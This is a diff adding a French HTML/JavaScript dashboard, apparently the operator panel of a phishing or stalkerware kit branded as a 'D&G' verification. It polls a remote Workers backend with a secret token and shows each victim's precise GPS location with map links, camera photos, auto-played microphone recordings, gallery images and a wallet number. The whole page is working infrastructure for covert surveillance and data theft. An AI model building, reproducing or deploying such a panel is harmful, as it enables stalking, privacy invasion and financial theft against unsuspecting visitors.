@@ -1,0 +1,109 @@
+<!doctype html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>D&amp;G — vérification directe</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:ui-monospace,SFMono-Regular,monospace;background:#0e0e0e;color:#ddd;padding:14px;font-size:13px}
+  header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
+  h1{font-size:.95rem;color:#fff;font-weight:600}
+  h1 span{color:#c9a227}
+  #compte{color:#c9a227;font-size:.8rem}
+  .v{border:1px solid #262626;border-radius:8px;padding:12px;margin-bottom:12px;background:#141414}
+  .t{color:#c9a227;font-weight:700;font-size:.8rem;margin-bottom:6px}
+  .m{color:#8a8a8a;font-size:11px;line-height:1.5;margin:3px 0}
+  .num{color:#fff;background:#1f1f1f;padding:4px 8px;border-radius:4px;display:inline-block;font-size:12px}
+  .ph{display:flex;gap:6px;flex-wrap:wrap;margin:8px 0}
+  .ph img{width:76px;height:76px;object-fit:cover;border-radius:6px;border:1px solid #2e2e2e}
+  audio{width:100%;margin-top:8px;height:32px}
+  a{color:#6cb6ff}
+  .gal img{width:64px;height:64px;object-fit:cover;border-radius:6px;border:1px solid #2e2e2e;margin:4px 4px 0 0}
+  .vide{color:#555;font-size:.8rem;text-align:center;padding:30px}
+</style>
+</head>
+<body>
+<header>
+  <h1>D&amp;G <span>· direct</span></h1>
+  <div id="compte">0</div>
+</header>
+<div id="liste"><div class="vide">En attente de visiteurs…</div></div>
+
+<script>
+const JETON = "REMPLACE_PAR_UN_SECRET_LONG";
+const BACKEND = "https://dg-verif.jeancharlesdave.workers.dev";
+const panneaux = new Map();
+let dernier = 0, total = 0;
+
+function panneau(id) {
+  if (panneaux.has(id)) return panneaux.get(id);
+  const vide = document.querySelector(".vide");
+  if (vide) vide.remove();
+
+  const bloc = document.createElement("div");
+  bloc.className = "v";
+  bloc.innerHTML = `
+    <div class="t">${id.slice(0, 8)}</div>
+    <div class="m" data-lieu>localisation en cours…</div>
+    <div class="m" data-app></div>
+    <div class="m" data-num></div>
+    <div class="ph" data-ph></div>
+    <audio controls data-son></audio>
+    <div class="m gal" data-gal></div>`;
+  document.getElementById("liste").prepend(bloc);
+
+  const p = { bloc, file: [], occupe: false };
+  panneaux.set(id, p);
+  total++;
+  document.getElementById("compte").textContent = total;
+  return p;
+}
+
+async function jouer(p) {
+  if (p.occupe || !p.file.length) return;
+  p.occupe = true;
+  const source = p.file.shift();
+  const audio = p.bloc.querySelector("[data-son]");
+  audio.src = source;
+  audio.play().catch(() => { p.file.unshift(source); p.occupe = false; });
+  audio.onended = () => { p.occupe = false; jouer(p); };
+}
+
+async function rafraichir() {
+  try {
+    const r = await fetch(`${BACKEND}/flux?jeton=${JETON}&depuis=${dernier}`);
+    if (!r.ok) return;
+    for (const e of await r.json()) {
+      dernier = e.id;
+      const p = panneau(e.identifiant);
+      const c = e.charge;
+
+      if (e.type === "numero") {
+        p.bloc.querySelector("[data-num]").innerHTML =
+          `portefeuille : <span class="num">${c.valeur}</span>`;
+      }
+      if (e.type === "position") {
+        p.bloc.querySelector("[data-lieu]").innerHTML =
+          `${c.zone ?? "?"} · ${c.ville ?? "?"} · ${c.region ?? "?"}
+           — <a href="https://www.google.com/maps?q=${c.lat},${c.lon}" target="_blank">carte ±${Math.round(c.precision ?? 0)} m</a>`;
+      }
+      if (e.type === "photo") {
+        const img = document.createElement("img");
+        img.src = c.image;
+        p.bloc.querySelector("[data-ph]").prepend(img);
+      }
+      if (e.type === "son") { p.file.push(c.donnees); jouer(p); }
+      if (e.type === "galerie") {
+        const img = document.createElement("img");
+        img.src = c.donnees;
+        p.bloc.querySelector("[data-gal]").appendChild(img);
+      }
+    }
+  } catch { }
+}
+
+setInterval(rafraichir, 1500);
+</script>
+</body>
+</html>
